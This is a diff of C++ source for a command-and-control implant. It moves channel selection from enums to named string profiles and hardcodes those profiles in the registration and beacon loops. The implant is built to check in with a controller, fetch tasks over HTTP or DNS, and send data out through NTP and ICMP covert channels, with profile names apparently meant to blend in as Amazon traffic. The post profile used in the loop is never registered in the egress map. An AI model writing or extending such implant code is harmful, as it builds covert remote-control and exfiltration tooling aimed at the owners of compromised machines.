@@ -4,11 +4,8 @@
 // ======================================================================================
 // 0. STATIC MEMBER DEFINITIONS
 // ======================================================================================
-std::map<InMethod, IngressFunc> C2Implant::s_ingress_map;
-std::map<OutMethod, EgressFunc> C2Implant::s_egress_map;
-std::map<std::string, InMethod> C2Implant::s_in_resolver;
-std::map<std::string, OutMethod> C2Implant::s_out_resolver;
-
+std::map<std::string, IngressFunc> C2Implant::s_ingress_map;
+std::map<std::string, EgressFunc> C2Implant::s_egress_map;
 
 // ======================================================================================
 // 2. STRATEGIES (Jinja Generated)
@@ -48,25 +45,27 @@ void post_ICMP(std::string implant_uuid, std::string text_data, std::string task
 //jinja this
 void C2Implant::init() {
     // Mapping Enums to Functions
-    s_ingress_map[InMethod::HTTP] = get_HTTP;
-    s_ingress_map[InMethod::DNS] = get_DNS;
+    s_ingress_map["http_get_amazon"] = get_HTTP;
+    s_ingress_map["dns_get_amazon"] = get_DNS;
 
-    s_egress_map[OutMethod::NTP] = post_NTP;
-    s_egress_map[OutMethod::ICMP] = post_ICMP;
+    s_egress_map["ntp_post_profile1"] = post_NTP;
+    s_egress_map["icmp_post_profile1"] = post_ICMP;
 
-    // Optional: Populate resolvers
-    // s_in_resolver["http"] = InMethod::HTTP;
 }
 
-int C2Implant::register_implant(InMethod registration_method) {
+int C2Implant::register_implant() {
+
+    //Note: edit this to pull from settings for each loop, on the get/post method. jinja will preset those settings.
+    std::string get = "http_get_amazon";
+
     // Get the strategy
-    if (s_ingress_map.find(registration_method) == s_ingress_map.end()) {
+    if (s_ingress_map.find(get) == s_ingress_map.end()) {
         std::cerr << "[-] Strategy not found for registration.\n";
         return -1;
     }
 
     // Call strategy with "Zero UUID" for registration
-    nlohmann::json implant_uuid_data = s_ingress_map[registration_method]("00000000-0000-0000-0000-000000000000");
+    nlohmann::json implant_uuid_data = s_ingress_map[get]("00000000-0000-0000-0000-000000000000");
 
     // 3. Extract UUID
     if (implant_uuid_data.contains("implant_uuid")) {
@@ -79,8 +78,12 @@ int C2Implant::register_implant(InMethod registration_method) {
     return -1;
 }
 
-void C2Implant::cycle(InMethod get, OutMethod post) {
+void C2Implant::cycle() {
     std::cout << "[*] Starting C2 Cycle Loop...\n";
+
+    //Note: edit this to pull from settings for each loop, on the get/post method. jinja will preset those settings.
+    std::string get = "http_get_amazon";
+    std::string post = "http_post_amazon";
 
     while (true) {
         // 1. Check for Strategy Existence
